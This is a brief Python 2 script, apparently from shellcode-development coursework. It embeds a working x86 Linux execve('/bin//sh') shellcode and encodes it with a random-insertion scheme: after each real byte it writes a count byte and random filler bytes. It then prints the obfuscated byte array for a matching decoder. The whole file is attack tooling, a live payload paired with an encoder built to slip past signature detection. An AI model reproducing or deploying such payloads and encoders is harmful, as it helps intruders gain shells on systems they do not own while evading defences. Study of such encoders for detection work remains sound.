#!/usr/bin/python
import random
#the the bytes to encode
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
encoded = []
#loop through bytes shellcode
for index, item in enumerate(shellcode) : 	# bytearray(shellcode) :
	good_b = "0x" + item.encode('hex') 	# this is the valid byte
	if index < len(shellcode)-1:		# if not the last byte go to encode...		
		my_ran = random.randint(1,4)	# first dummy byte that indicate the next position of a valid one
		encoded.append(good_b)		
		encoded.append(hex(my_ran))	# append both
		i = 1;
		while i < my_ran :					
			my_dumm =  random.randint(1,200)	#add other dummy bytes to the next valid byte
			encoded.append(hex(my_dumm))
			i +=1 
	else:
		encoded.append(good_b)
#print the encoded shellcode
print "Len: " + str(len(encoded))
for idx, val in enumerate(encoded):
 if idx < len(encoded)-1:
  print val + ",",
 else:
  print val,
